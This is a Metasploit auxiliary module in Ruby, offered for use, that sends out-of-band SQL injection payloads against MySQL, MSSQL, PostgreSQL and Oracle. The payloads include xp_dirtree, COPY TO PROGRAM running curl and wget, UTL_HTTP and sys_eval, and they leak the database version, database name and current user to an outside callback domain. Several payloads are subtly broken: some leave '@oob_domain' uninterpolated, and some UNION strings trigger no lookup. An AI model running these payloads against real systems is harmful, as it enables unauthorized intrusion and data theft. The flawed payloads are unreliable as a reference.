##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTTP SQL Injection Out-of-Band Scanner',
      'Description'    => %q{
        This module detects SQL injection vulnerabilities using Out-of-Band (OOB) techniques.
        It sends payloads with DNS/HTTP exfiltration to your Interactsh domain.
        
        Usage:
        1. Start Interactsh client: docker run -it projectdiscovery/interactsh-client -server https://oast.pro
        2. Copy the generated domain (e.g., abc123.oast.pro)
        3. Set OOB_DOMAIN to that domain in this module
        4. Run the module and monitor callbacks in Interactsh client
        
        Supports MySQL, PostgreSQL, MSSQL, and Oracle databases.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://owasp.org/www-community/attacks/SQL_Injection'],
          ['URL', 'https://github.com/projectdiscovery/interactsh']
        ]
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI to test', '/']),
      OptString.new('METHOD', [true, 'HTTP Method (GET/POST)', 'GET']),
      OptString.new('PARAMS', [false, 'Parameters to test (comma-separated)', '']),
      OptString.new('COOKIE', [false, 'Cookie header for authentication', '']),
      OptString.new('EXTRA_PARAMS', [false, 'Additional fixed parameters', '']),
      OptString.new('OOB_DOMAIN', [true, 'Interactsh domain from your client', '']),
      OptEnum.new('DBMS', [true, 'Target DBMS type', 'MySQL', ['MySQL', 'MSSQL', 'PostgreSQL', 'Oracle']]),
      OptEnum.new('INJECTION_TYPE', [true, 'Injection context type', 'string', ['numeric', 'string']]),
      OptInt.new('SLEEP_BETWEEN', [true, 'Sleep between payloads (seconds)', 1]),
      OptBool.new('VERBOSE', [false, 'Enable verbose output', false])
    ])
  end

  def run_host(ip)
    # Validate OOB domain
    if datastore['OOB_DOMAIN'].empty?
      print_error("OOB_DOMAIN is required!")
      print_error("Start Interactsh client first:")
      print_error("  docker run -it projectdiscovery/interactsh-client -server https://oast.pro")
      print_error("Then set OOB_DOMAIN to the generated domain")
      return
    end
    
    @oob_domain = datastore['OOB_DOMAIN'].strip
    
    uri = normalize_uri(target_uri.path)
    method = datastore['METHOD'].upcase
    
    print_status("=" * 70)
    print_status("SQL Injection Out-of-Band Scanner")
    print_status("=" * 70)
    print_status("Target: #{ip}:#{rport}#{uri}")
    print_status("OOB Domain: #{@oob_domain}")
    print_status("DBMS: #{datastore['DBMS']}")
    print_status("Injection Type: #{datastore['INJECTION_TYPE']}")
    print_status("=" * 70)
    print_status("")
    
    # Get parameters to test
    params = get_test_params
    
    if params.empty?
      print_error("No parameters to test")
      return
    end
    
    # Test connection first
    vprint_status("Testing connection to target...")
    test_response = send_injection_request(uri, method, params.first, "1")
    
    unless test_response
      print_error("Cannot connect to target. Check RHOSTS, RPORT, and VHOST settings.")
      return
    end
    
    print_good("Connection successful (Status: #{test_response.code})")
    print_status("")
    
    # Send payloads for each parameter
    params.each do |param|
      test_parameter(uri, method, param)
      print_status("")
    end
    
    # Final instructions
    print_status("=" * 70)
    print_good("All payloads sent successfully!")
    print_status("=" * 70)
    print_status("Check your Interactsh client for DNS/HTTP callbacks")
    print_status("Callbacks will show:")
    print_status("  - Parameter name in subdomain (e.g., id-p1-...)")
    print_status("  - Payload number (p1, p2, p3)")
    print_status("  - Exfiltrated data (version, database name, etc.)")
    print_status("=" * 70)
  end

  def test_parameter(uri, method, param)
    print_status("-" * 70)
    print_status("Testing Parameter: #{param}")
    print_status("-" * 70)
    
    payloads = generate_oob_payloads(param)
    success_count = 0
    
    payloads.each_with_index do |payload_info, idx|
      print_status("[#{idx + 1}/#{payloads.length}] #{payload_info[:name]}")
      
      if datastore['VERBOSE']
        print_status("    Payload: #{payload_info[:payload][0..120]}...")
        print_status("    Expected callback: #{payload_info[:expected_callback]}")
      end
      
      response = send_injection_request(uri, method, param, payload_info[:payload])
      
      if response
        success_count += 1
        
        if datastore['VERBOSE']
          print_good("    Request sent (Status: #{response.code}, Size: #{response.body.length} bytes)")
          
          # Check for SQL errors
          if is_error_response?(response)
            print_status("    SQL error detected in response")
          end
          
          # Check if payload appears in response (for union-based that also shows in page)
          if response.body.include?(@oob_domain)
            print_good("    OOB domain appears in response!")
          end
        else
          print_good("    ✓ Sent")
        end
      else
        print_error("    ✗ Failed to send")
      end
      
      # Sleep between payloads
      sleep(datastore['SLEEP_BETWEEN']) if idx < payloads.length - 1
    end
    
    print_status("-" * 70)
    print_status("Summary: #{success_count}/#{payloads.length} payloads sent for '#{param}'")
    
    if success_count > 0
      print_good("Monitor your Interactsh client for callbacks matching: #{param}-p*")
    end
  end

  def generate_oob_payloads(param)
    payloads = []
    
    # Sanitize param name for DNS (remove special chars)
    safe_param = param.gsub(/[^a-zA-Z0-9]/, '').downcase[0..10]
    
    # Determine injection prefix
    prefix = datastore['INJECTION_TYPE'] == 'string' ? "1' " : "1 "
    
    case datastore['DBMS']
    when 'MySQL'
      # Payload 1: UNION with MySQL version
      payloads << {
        name: 'MySQL UNION - Extract Version',
        payload: "#{prefix}UNION SELECT 1,CONCAT('#{safe_param}-p1-',REPLACE(@@version,'.',''),'.#{@oob_domain}')-- -",
        expected_callback: "#{safe_param}-p1-[version].#{@oob_domain}"
      }
      
      # Payload 2: UNION with database name
      payloads << {
        name: 'MySQL UNION - Extract Database',
        payload: "#{prefix}UNION SELECT 1,CONCAT('#{safe_param}-p2-',DATABASE(),'.#{@oob_domain}')-- -",
        expected_callback: "#{safe_param}-p2-[dbname].#{@oob_domain}"
      }
      
      # Payload 3: UNION with current user
      payloads << {
        name: 'MySQL UNION - Extract User',
        payload: "#{prefix}UNION SELECT 1,CONCAT('#{safe_param}-p3-',REPLACE(USER(),'@','-'),'.#{@oob_domain}')-- -",
        expected_callback: "#{safe_param}-p3-[user].#{@oob_domain}"
      }
      
      # Payload 4: Simple test payload
      payloads << {
        name: 'MySQL UNION - Simple Test',
        payload: "#{prefix}UNION SELECT 1,CONCAT('#{safe_param}-p4-test.#{@oob_domain}')-- -",
        expected_callback: "#{safe_param}-p4-test.#{@oob_domain}"
      }
      
      # Payload 5: LOAD_FILE UNC (Windows MySQL only)
      payloads << {
        name: 'MySQL LOAD_FILE UNC Path',
        payload: "#{prefix}AND LOAD_FILE(CONCAT('\\\\\\\\#{safe_param}-p5.',@oob_domain,'\\\\test'))-- -",
        expected_callback: "#{safe_param}-p5.#{@oob_domain}"
      }
      
      # Payload 6: SELECT ... INTO OUTFILE with UNC (Windows)
      payloads << {
        name: 'MySQL INTO OUTFILE UNC',
        payload: "#{prefix}UNION SELECT 1,CONCAT('#{safe_param}-p6-',@@version) INTO OUTFILE '\\\\\\\\#{safe_param}-p6.#{@oob_domain}\\\\test.txt'-- -",
        expected_callback: "#{safe_param}-p6.#{@oob_domain}"
      }
      
      # Payload 7: MySQL with sys_eval/sys_exec (if plugin available)
      payloads << {
        name: 'MySQL sys_eval nslookup',
        payload: "#{prefix}AND (SELECT sys_eval(CONCAT('nslookup #{safe_param}-p7.',@oob_domain))) IS NOT NULL-- -",
        expected_callback: "#{safe_param}-p7.#{@oob_domain}"
      }
      
    when 'MSSQL'
      # Payload 1: xp_dirtree
      payloads << {
        name: 'MSSQL xp_dirtree',
        payload: "#{prefix}; EXEC master..xp_dirtree '\\\\#{safe_param}-p1.#{@oob_domain}\\a'-- -",
        expected_callback: "#{safe_param}-p1.#{@oob_domain}"
      }
      
      # Payload 2: xp_fileexist
      payloads << {
        name: 'MSSQL xp_fileexist',
        payload: "#{prefix}; EXEC master..xp_fileexist '\\\\#{safe_param}-p2.#{@oob_domain}\\a'-- -",
        expected_callback: "#{safe_param}-p2.#{@oob_domain}"
      }
      
      # Payload 3: xp_subdirs
      payloads << {
        name: 'MSSQL xp_subdirs',
        payload: "#{prefix}; EXEC master..xp_subdirs '\\\\#{safe_param}-p3.#{@oob_domain}\\a'-- -",
        expected_callback: "#{safe_param}-p3.#{@oob_domain}"
      }
      
      # Payload 4: xp_getfiledetails
      payloads << {
        name: 'MSSQL xp_getfiledetails',
        payload: "#{prefix}; EXEC master..xp_getfiledetails '\\\\#{safe_param}-p4.#{@oob_domain}\\a'-- -",
        expected_callback: "#{safe_param}-p4.#{@oob_domain}"
      }
      
      # Payload 5: fn_xe_file_target_read_file
      payloads << {
        name: 'MSSQL fn_xe_file_target',
        payload: "#{prefix}; SELECT * FROM fn_xe_file_target_read_file('\\\\#{safe_param}-p5.#{@oob_domain}\\*.xel',NULL,NULL,NULL)-- -",
        expected_callback: "#{safe_param}-p5.#{@oob_domain}"
      }
      
    when 'PostgreSQL'
      # Payload 1: COPY TO PROGRAM with nslookup
      payloads << {
        name: 'PostgreSQL COPY - nslookup',
        payload: "#{prefix}; COPY (SELECT '') TO PROGRAM 'nslookup #{safe_param}-p1.#{@oob_domain}'-- -",
        expected_callback: "#{safe_param}-p1.#{@oob_domain}"
      }
      
      # Payload 2: COPY with curl (HTTP)
      payloads << {
        name: 'PostgreSQL COPY - curl',
        payload: "#{prefix}; COPY (SELECT '') TO PROGRAM 'curl http://#{safe_param}-p2.#{@oob_domain}'-- -",
        expected_callback: "#{safe_param}-p2.#{@oob_domain}"
      }
      
      # Payload 3: COPY with wget
      payloads << {
        name: 'PostgreSQL COPY - wget',
        payload: "#{prefix}; COPY (SELECT '') TO PROGRAM 'wget http://#{safe_param}-p3.#{@oob_domain}'-- -",
        expected_callback: "#{safe_param}-p3.#{@oob_domain}"
      }
      
      # Payload 4: COPY with ping
      payloads << {
        name: 'PostgreSQL COPY - ping',
        payload: "#{prefix}; COPY (SELECT '') TO PROGRAM 'ping -c 1 #{safe_param}-p4.#{@oob_domain}'-- -",
        expected_callback: "#{safe_param}-p4.#{@oob_domain}"
      }
      
    when 'Oracle'
      # Payload 1: UTL_HTTP.REQUEST
      payloads << {
        name: 'Oracle UTL_HTTP',
        payload: "#{prefix}AND UTL_HTTP.REQUEST('http://#{safe_param}-p1.#{@oob_domain}/') IS NOT NULL-- -",
        expected_callback: "#{safe_param}-p1.#{@oob_domain}"
      }
      
      # Payload 2: UTL_INADDR.GET_HOST_ADDRESS
      payloads << {
        name: 'Oracle UTL_INADDR',
        payload: "#{prefix}AND UTL_INADDR.GET_HOST_ADDRESS('#{safe_param}-p2.#{@oob_domain}') IS NOT NULL-- -",
        expected_callback: "#{safe_param}-p2.#{@oob_domain}"
      }
      
      # Payload 3: UTL_INADDR.GET_HOST_NAME
      payloads << {
        name: 'Oracle UTL_INADDR.GET_HOST_NAME',
        payload: "#{prefix}AND UTL_INADDR.GET_HOST_NAME('#{safe_param}-p3.#{@oob_domain}') IS NOT NULL-- -",
        expected_callback: "#{safe_param}-p3.#{@oob_domain}"
      }
      
      # Payload 4: DBMS_LDAP.INIT
      payloads << {
        name: 'Oracle DBMS_LDAP',
        payload: "#{prefix}AND DBMS_LDAP.INIT('#{safe_param}-p4.#{@oob_domain}',80) IS NOT NULL-- -",
        expected_callback: "#{safe_param}-p4.#{@oob_domain}"
      }
      
      # Payload 5: UTL_HTTP with HTTPURITYPE
      payloads << {
        name: 'Oracle HTTPURITYPE',
        payload: "#{prefix}AND (SELECT HTTPURITYPE('http://#{safe_param}-p5.#{@oob_domain}/').GETCLOB() FROM DUAL) IS NOT NULL-- -",
        expected_callback: "#{safe_param}-p5.#{@oob_domain}"
      }
    end
    
    payloads
  end

  def send_injection_request(uri, method, param, payload)
    begin
      extra_params = {}
      if datastore['EXTRA_PARAMS'] && !datastore['EXTRA_PARAMS'].empty?
        extra_params = parse_extra_params(datastore['EXTRA_PARAMS'])
      end
      
      if method == 'GET'
        vars_get = { param => payload }.merge(extra_params)
        
        res = send_request_cgi(
          'uri'    => uri,
          'method' => 'GET',
          'vars_get' => vars_get,
          'headers' => build_headers
        )
      else
        vars_post = { param => payload }.merge(extra_params)
        
        res = send_request_cgi(
          'uri'    => uri,
          'method' => 'POST',
          'vars_post' => vars_post,
          'headers' => build_headers
        )
      end
      
      return res
      
    rescue => e
      vprint_error("Request error: #{e.message}")
      return nil
    end
  end
  
  def build_headers
    headers = {}
    
    if datastore['COOKIE'] && !datastore['COOKIE'].empty?
      headers['Cookie'] = datastore['COOKIE']
    end
    
    if datastore['VHOST'] && !datastore['VHOST'].empty?
      headers['Host'] = datastore['VHOST']
    end
    
    headers
  end

  def parse_extra_params(params_string)
    params = {}
    params_string.split('&').each do |pair|
      key, val = pair.split('=', 2)
      params[key] = val if key
    end
    params
  end

  def get_test_params
    if datastore['PARAMS'] && !datastore['PARAMS'].empty?
      return datastore['PARAMS'].split(',').map(&:strip)
    else
      return ['id', 'page', 'item', 'user', 'cat', 'category']
    end
  end

  def is_error_response?(response)
    return true if response.code >= 500
    
    error_patterns = [
      /SQL syntax/i,
      /mysql_fetch/i,
      /ORA-\d{5}/i,
      /PostgreSQL.*ERROR/i,
      /Microsoft SQL Server/i,
      /ODBC.*Driver/i,
      /SQLite.*error/i,
      /Unknown column/i,
      /ERROR:/i,
      /Warning.*mysql/i
    ]
    
    error_patterns.any? { |pattern| response.body =~ pattern }
  end

  def vprint_status(msg)
    print_status(msg) if datastore['VERBOSE']
  end
  
  def vprint_good(msg)
    print_good(msg) if datastore['VERBOSE']
  end
  
  def vprint_error(msg)
    print_error(msg) if datastore['VERBOSE']
  end
end
                 
